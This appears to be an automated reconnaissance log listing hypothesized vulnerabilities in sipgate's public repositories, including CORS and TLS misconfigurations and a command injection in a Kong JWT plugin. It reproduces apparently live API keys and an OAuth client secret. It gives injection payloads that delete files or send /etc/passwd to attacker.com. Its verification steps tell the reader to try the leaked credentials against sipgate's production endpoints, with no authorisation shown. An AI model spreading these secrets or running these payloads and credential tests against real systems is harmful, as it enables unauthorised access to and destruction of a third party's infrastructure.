TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-09 19:59:38 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-09 22:24:46 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-10 00:35:37 UTC
[HYP] Hardcoded Internal Redis Endpoint (RFC-1918) Across 15 CLINQ Bridge Repos
class: MISCONFIG
asset: sipgate/clinq-bridge-{sipgate,hubspot,google,pipedrive,salesforce,zoho,zammad,freshsales,copper,agilecrm,1sales,outlook,pipeliner,moco,podio}/k8s/template/deployment.yml:47
confidence: 95
reasoning: All 15 deployment manifests hardcode `REDIS_URL: rediss://10.37.248.211:6378` — internal RFC-1918 IP with TLS Redis on non-standard port 6378. GCP project `clinq-services`, zone `europe-west3` confirmed via cloudbuild.yaml.
impact: HIGH — Exposes internal Redis endpoint; aids lateral movement or targeted SSRF if any internal-facing service is reachable.
verify_steps: 1) DNS/ICMP 10.37.248.211 from internal network. 2) Verify GCP project `clinq-services` zone `europe-west3` still hosts this Redis. 3) Confirm `rediss://` TLS termination.
[HYP] TLS Certificate Verification Disabled for Redis Connection
class: MISCONFIG
asset: sipgate/clinq-bridge-sipgate/src/cache/storage/redis-storage-adapter.ts:22
confidence: 90
reasoning: Redis client connects with `tls: { rejectUnauthorized: false }`, disabling TLS certificate verification. Allows MITM on Redis connections despite `rediss://` (TLS) scheme.
impact: MEDIUM — Enables man-in-the-middle on Redis connections. Cached contact data could be intercepted or tampered with.
verify_steps: 1) Confirm production deployment uses `rediss://` URL. 2) Verify whether this setting is overridden via environment variables.
[HYP] Hardcoded API Keys and DB Credentials in Radau docker-compose.yml
class: SECRET
asset: sipgate/radau/docker-compose.yml:18-21
confidence: 95
reasoning: Hardcoded plaintext: `API_KEY_MANAGEMENT=pYWVcrR4DmgCfkfmEte5nGNW`, `API_KEY_RADIUS=u39fNShDX6fAeXtWY6bZWY9x`, `DB_PASSWORD=wifi`, `POSTGRES_PASSWORD=wifi`, `POSTGRES_USER=wifi`. README confirms radau is a live WPA Enterprise RADIUS microservice.
impact: MEDIUM — If any radau instance uses these default keys, the management API (user create/delete/token management) is fully exposed.
verify_steps: 1) Send Authorization header with these keys to any radau `/user` or `/token` endpoint. 2) Verify GCP project `clinq-services` doesn't also host radau. 3) Test keys against OpenAPI spec at `/docs/openapi.yml`.
[HYP] Default CORS AllowAllOrigins + AllowCredentials in Radau
class: MISCONFIG
asset: sipgate/radau/main.go:16-17
confidence: 85
reasoning: When `CORS_ORIGINS` env var is not set (default), `initCORSConfig()` sets `corsConfig.AllowAllOrigins = true` + `corsConfig.AllowCredentials = true`. Any origin can make credentialed cross-origin requests. `Authorization` header is also explicitly allowed.
impact: MEDIUM — Attacker-controlled page can perform cross-origin requests with user's API key/JWT, enabling account takeover or data exfiltration.
verify_steps: 1) Confirm default path (no `CORS_ORIGINS` env) is the production configuration. 2) Verify `AllowAllOrigins + AllowCredentials` is exploitable from `evil.com`. 3) Check if reverse proxy strips CORS headers.
[HYP] OS Command Injection in Kong JWT Firebase Plugin via JWT `kid` Header
class: SSRF
asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:31-34
confidence: 95
reasoning: `grab_public_key_bykid(t_kid)` concatenates JWT header `kid` value directly into shell command: `local cmd = "wget -qO - " .. google_url .. " | grep -i " .. t_kid .. magic`. A crafted JWT with malicious kid (e.g. `"; rm -rf / #") would execute arbitrary OS commands via `io.popen(cmd)`. No sanitization or escaping.
impact: CRITICAL — RCE on the Kong gateway node; attacker controls the full JWT header. Affects any Kong instance running this plugin.
verify_steps: 1) Deploy the plugin with a Firebase project_id. 2) Send request with JWT containing kid: `"; curl attacker.com/exfil?data=$(cat /etc/passwd) #". 3) Observe outbound request to attacker.com or command execution.
[HYP] Secondary Injection Vector + Bug in push_public_key_into_file
class: OTHER
asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:47-50
confidence: 90
reasoning: `push_public_key_into_file()` constructs: `echo -n " .. publickey .. " > " .. shm`. If `grab_public_key_bykid` returns output containing shell metacharacters, the echo command is vulnerable to injection. Additionally, line 48 has typo `cmd_handlel:close()` (should be `cmd_handle`), causing Lua runtime error and leaving SHM file in undefined state.
impact: HIGH — Secondary injection vector; typo means new keys are never properly saved, degrading security posture.
verify_steps: 1) Trace call path: `do_authentication → grab_public_key_bykid → push_public_key_into_file`. 2) Verify `cmd_handlel` typo causes Lua error. 3) Confirm SHM write is never reached.
[HYP] Hardcoded OAuth Client Credentials in REST API Example
class: SECRET
asset: sipgate/rest-api-examples/webapp-nodejs/.npmrc.dist:2-3
confidence: 65
reasoning: Contains `client_id=2414245-0-e24e0091-8265-11e7-93e7-e5fb754b756f` and `client_secret=187812ce-b546-4fa9-96e8-771e9775c3cb`. Follow sipgate OAuth client credential format. `.dist` template ships real-looking credentials (not placeholders). README instructs users to copy to `.npmrc` (gitignored).
impact: LOW-MEDIUM — If sipgate OAuth server hasn't revoked this credential, it could be used to obtain access tokens. Even if revoked, reveals exact credential format.
verify_steps: 1) Attempt OAuth token exchange using these credentials against `https://api.sipgate.com/login/third-party/protocol/openid-connect/token`. 2) Check if client is in sipgate's developer portal. 3) Verify `.gitignore` excludes `.npmrc`.
[HYP] Hardcoded Session Secret in REST API Example
class: OTHER
asset: sipgate/rest-api-examples/webapp-nodejs/index.js:30
confidence: 70
reasoning: Express session middleware uses `secret: 'sipgate-rest-api-demo'` — hardcoded, publicly known signing key. Committed to public repo. Establishes pattern that could be copy-pasted into production.
impact: LOW — Session fixation risk if used in production. In example repo, impact limited to demonstrating insecure pattern.
verify_steps: 1) Verify no production instances copy this exact secret. 2) Check if session secret is overridable via environment variable.
[HYP] Default Cookie Secret in Ansible Logger (Slim Framework)
class: MISCONFIG
asset: sipgate/ansible-logger/ansible-logger-web/includes/Slim/Slim.php:307
confidence: 70
reasoning: Default cookie secret key set to `'CHANGE_ME'`. Also, `cookies.secure` and `cookies.httponly` are both set to `false`. If deployed without changing, session cookies can be forged.
impact: LOW — Session forgery if ansible-logger is deployed in production with default config.
verify_steps: 1) Check if ansible-logger is deployed in production. 2) Verify if secret was changed from default.
[HYP] Hardcoded Internal Dev URLs in sipgategcx Browser Extension
class: MISCONFIG
asset: sipgate/sipgategcx/manifest.json (permissions list)
confidence: 70
reasoning: Browser extension manifest exposes internal API endpoints: `http://api.dev.sipgate.net/RPC2` (HTTP, not HTTPS) and `https://samurai.sipgate.net/RPC2`. Reveals internal hostnames and API paths.
impact: LOW — Information disclosure of internal infrastructure; dev endpoint is HTTP.
verify_steps: 1) Verify if `api.dev.sipgate.net` and `samurai.sipgate.net` are accessible externally. 2) Check if extension is still maintained.
[HYP] Hardcoded JWT Secret in AI Demo MCP Server Mock Service
class: SECRET
asset: sipgate/sipgate-ai-demo-auth-mcp-server/src/mock-service/server.ts:8
confidence: 75
reasoning: `JWT_SECRET = "mock-service-secret-key"` hardcoded in mock authentication service. Used to sign/verify tokens for `/contracts` API. Committed to public repo.
impact: LOW — Demo/mock service only, but if deployed alongside real services, could forge JWT tokens.
verify_steps: 1) Check if mock service is deployed in any environment. 2) Verify if JWT_SECRET is overridable via environment variable.
[HYP] Hardcoded HubSpot OAuth Client ID in K8s Deployment
class: SECRET
asset: sipgate/clinq-bridge-hubspot/k8s/template/deployment.yml:50-51
confidence: 85
reasoning: `HUBSPOT_CLIENT_ID: 6bd4c77d-7d54-47fe-b637-6be96d8c3c05` hardcoded in plaintext. Callback URL `https://hubspot.bridge.clinq.com/oauth2/callback` also exposed.
impact: LOW-MEDIUM — Reveals registered OAuth client identity and callback URL. Combined with other findings, enables targeted phishing.
verify_steps: 1) Verify client ID is registered in HubSpot's developer portal. 2) Check if OAuth app has excessive scopes.
[HYP] Hardcoded Salesforce OAuth Client ID in K8s Deployment
class: SECRET
asset: sipgate/clinq-bridge-salesforce/k8s/template/deployment.yml:50-51
confidence: 85
reasoning: `SF_OAUTH_PROVIDER_CLIENT_ID: 3MVG9TSaZ8P6zP1roce2837A2tPdW0m11CDTD2ftXt4UOVzip.GoHEMhsA8V6ILC3Fmv0U6KCYSPecLfH.gQX` hardcoded in plaintext.
impact: LOW — Reveals registered Salesforce OAuth client identity.
verify_steps: 1) Verify client ID is registered in Salesforce's developer portal.
[HYP] Hardcoded Zoho OAuth Client ID in K8s Deployment
class: SECRET
asset: sipgate/clinq-bridge-zoho/k8s/template/deployment.yml:52
confidence: 85
reasoning: `ZOHO_CLIENT_ID: "1000.ZZIQ2V2WLZOW0HY6WY28XTRLHXPVRR"` hardcoded in plaintext.
impact: LOW — Reveals registered Zoho OAuth client identity.
verify_steps: 1) Verify client ID is registered in Zoho's developer portal.
[HYP] Hardcoded Podio OAuth Client ID in K8s Deployment
class: SECRET
asset: sipgate/clinq-bridge-podio/k8s/template/deployment.yml:50
confidence: 85
reasoning: `PODIO_CLIENT_ID: clinq-nnhvbx` hardcoded in plaintext.
impact: LOW — Reveals registered Podio OAuth client identity.
verify_steps: 1) Verify client ID is registered in Podio's developer portal.
[HYP] Hardcoded Pipedrive OAuth Client ID in K8s Deployment
class: SECRET
asset: sipgate/clinq-bridge-pipedrive/k8s/template/deployment.yml:54
confidence: 85
reasoning: `CLIENT_ID: 36bc4ebf413cf06b` hardcoded in plaintext. `CLIENT_SECRET` properly referenced from K8s secret.
impact: LOW — Reveals registered Pipedrive OAuth client identity.
verify_steps: 1) Verify client ID is registered in Pipedrive's developer portal.
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-10 05:12:38 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-10 09:52:15 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-10 14:00:38 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-10 17:37:15 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-10 20:00:46 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-10 22:37:38 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-11 00:31:27 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-11 05:10:59 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-11 09:46:37 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-11 13:58:58 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-11 17:44:06 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-11 20:01:12 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-11 22:43:38 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
